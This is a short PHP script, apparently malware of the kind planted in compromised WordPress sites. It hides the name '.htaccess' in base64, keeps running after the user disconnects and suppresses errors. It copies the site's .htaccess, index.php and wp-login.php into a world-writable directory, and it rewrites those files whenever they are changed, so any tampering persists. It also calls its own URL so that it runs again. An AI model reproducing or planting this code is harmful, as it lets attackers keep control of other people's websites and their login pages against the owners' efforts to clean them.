<?php

set_time_limit(0);
ignore_user_abort(true);
error_reporting(0);

$name = base64_decode("Lmh0YWNjZXNz");

$ht = file_get_contents("$name");
$index = file_get_contents("index.php");
$go = file_get_contents("wp-login.php");

$diralldat =  pathinfo(__FILE__);
$directory = $diralldat['dirname'];
$directory = explode("/", $directory);
$directory = $directory[sizeof($directory)-1];

	sleep(5);	

	if (file_exists("../".$directory)) $z=0;
	else
	{
	mkdir("../".$directory, 0777);
    chmod("../".$directory, 0777);

	$out = fopen ("../".$directory."/index.php", "w");
	fwrite($out, $index);
	fclose($out);
	
	$out = fopen ("../".$directory."/$name", "w");
	fwrite($out, $ht);
	fclose($out);	

	$out = fopen ("../".$directory."/wp-login.php", "w");
	fwrite($out, $go);
	fclose($out);	

$url = ((!empty($_SERVER['HTTPS'])) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, $url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_TIMEOUT, 3);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
$text = curl_exec($ch); 
curl_close($ch);

exit;
	
	}

$ht_check = file_get_contents("$name");
$index_check = file_get_contents("index.php");
$go_check = file_get_contents("wp-login.php");


if ($ht_check !== $ht)
{
	@chmod($name, 0777);
	$out = fopen ($name, "w");
	fwrite($out, $ht);
	fclose($out);
	@chmod($name, 0644);
}

if ($index_check !== $index)
{
	@chmod("index.php", 0777);
	@unlink("index.php");
	$out = fopen ("index.php", "w");
	fwrite($out, $index);
	fclose($out);	
}

if ($go_check !== $go)
{
	@chmod("wp-login.php", 0777);
	@unlink("wp-login.php");
	$out = fopen ("wp-login.php", "w");
	fwrite($out, $go);
	fclose($out);	
}



$url = ((!empty($_SERVER['HTTPS'])) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, $url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_TIMEOUT, 3);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
$text = curl_exec($ch); 
curl_close($ch);
?>